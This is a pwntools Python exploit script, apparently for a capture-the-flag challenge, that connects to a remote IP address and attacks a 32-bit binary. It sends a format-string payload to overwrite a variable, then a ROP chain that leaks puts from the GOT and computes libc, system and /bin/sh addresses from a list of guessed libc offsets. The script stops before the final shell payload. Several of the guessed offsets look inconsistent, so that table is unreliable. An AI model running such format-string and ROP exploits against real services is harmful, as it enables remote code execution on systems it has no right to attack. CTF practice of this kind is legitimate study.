from pwn import *

context(arch='i386', os='linux', log_level='debug')

elf = ELF('pwn_permission')

# Addresses
puts_plt = elf.plt['puts']      # 0x8049060
puts_got = elf.got['puts']      # 0x804c014
vuln_addr = elf.symbols['vuln'] # 0x8049227
main_addr = elf.symbols['main'] # 0x8049270
target_val_addr = 0x804c030
ret_gadget = 0x804900e

buf_to_ret = 0x90 + 4  # 148

# Stage 1: Format string to set target_val = 5
fmt_payload = p32(target_val_addr) + b'%1c%4$n'

# Connect
conn = remote('39.96.193.120', 10000)

# Receive initial message
conn.recv(timeout=5)

# Stage 1: Send format string payload
conn.send(fmt_payload)

import time
time.sleep(1)
response = conn.recv(timeout=5)
log.info(f"After fmt payload: {response}")

# Stage 2: ROP chain to leak puts@GOT and return to main
# Return to main instead of vuln so we can reuse the format string
rop_payload = b'A' * buf_to_ret
rop_payload += p32(puts_plt)    # call puts
rop_payload += p32(main_addr)   # return to main for second stage
rop_payload += p32(puts_got)    # argument: puts@GOT

conn.send(rop_payload)

time.sleep(1)

# Receive the leaked puts address
leak_data = conn.recv(timeout=5)
log.info(f"Leak data raw: {leak_data.hex()}")

# Extract puts address - first 4 bytes after any initial output
# The puts function outputs until it hits a null byte
# puts@GOT contains the full puts address
puts_leak = u32(leak_data[:4])
log.info(f"Leaked puts address: 0x{puts_leak:x}")

# Try different libc versions for Ubuntu 20.04 (libc-2.31)
# Common offsets for puts in different libc versions:
# libc-2.31 (Ubuntu 20.04): puts offset = 0x067e0 or similar

# Let's try to calculate libc base with different offsets
# and see which one gives us a valid system address

# For Ubuntu 20.04 libc-2.31 i386:
# puts: 0x067e0
# system: 0x03cd10  
# /bin/sh: 0x17b8cf

# These are common offsets, let me try them
# But first, let me try using the write@plt to leak more info

# Actually, let me try a different approach - use the write syscall
# which gives us more control over what we leak

# For now, let me try common libc-2.31 offsets
# The puts address 0xf7d7a1e0 suggests libc base around 0xf7d70000

# Let me try to identify the libc by the last 12 bits of puts
puts_last_12 = puts_leak & 0xfff
log.info(f"puts last 12 bits: 0x{puts_last_12:x}")

# 0x1e0 is the last 12 bits of puts
# This is consistent with libc-2.31 where puts offset ends in 0x1e0

# Try libc6-i386_2.31-0ubuntu9.16_amd64 offsets
# puts: 0x6a1e0
# system: 0x3cd10
# str_bin_sh: 0x17b8cf

# Actually, let me try multiple offset combinations
libc_offsets = [
    # (puts_offset, system_offset, binsh_offset, name)
    (0x6a1e0, 0x3cd10, 0x17b8cf, "libc-2.31-1"),
    (0x075e0, 0x03cd0, 0x13880, "libc-2.31-2"),
    (0x067e0, 0x03a60, 0x12bff, "libc-2.27-1"),
    (0x080e0, 0x04140, 0x158e8, "libc-2.31-3"),
]

for puts_off, sys_off, binsh_off, name in libc_offsets:
    libc_base = puts_leak - puts_off
    system_addr = libc_base + sys_off
    binsh_addr = libc_base + binsh_off
    log.info(f"{name}: libc_base=0x{libc_base:x}, system=0x{system_addr:x}, /bin/sh=0x{binsh_addr:x}")
    # Check if libc_base looks reasonable (aligned to page boundary)
    if libc_base & 0xfff == 0:
        log.info(f"  -> libc_base is page-aligned! This might be correct.")

conn.close()